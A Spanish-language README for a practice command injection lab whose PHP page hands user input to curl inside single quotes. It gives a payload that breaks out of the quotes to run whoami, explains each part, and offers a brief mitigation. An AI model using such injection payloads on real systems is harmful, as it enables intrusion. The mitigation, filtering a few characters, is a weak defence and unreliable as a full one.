# Command Injection Lab 002

## Descripciones
### Descripcion (vuln.php)
Es un laboratorio easy de vulnerar, solo tiene una medida de seguridad muy facil de vulnerar la cual es encerrar el output entre comillas simples una medida muy debil

## Vulnerar
### Vulnerar (vuln.php)

Ejemplos de vulnerabilidades:
```
Entrada: ' https://hola.com; whoami; echo '

Salida:
www-data (resultado del whoami)

Explicacion:
primera comilla simple('): Completa la comilla simple que encierra la entrada
https://hola.com: Pasa una url para que la web haga su curl
punto y coma(;): Concatenacion de comandos
whoami: El comando que se quiere ejecutar
punto y coma(;): Concatenacion de comandos
echo ': No imprime nada porque es un comando para evitar la ultima comilla simple
```

## Como evitarlo?
Se puede evitar aplicando multiples comprobaciones de entrada como evitar caracteres que no deve llevar una url normal(;, &, ', ", etc...)
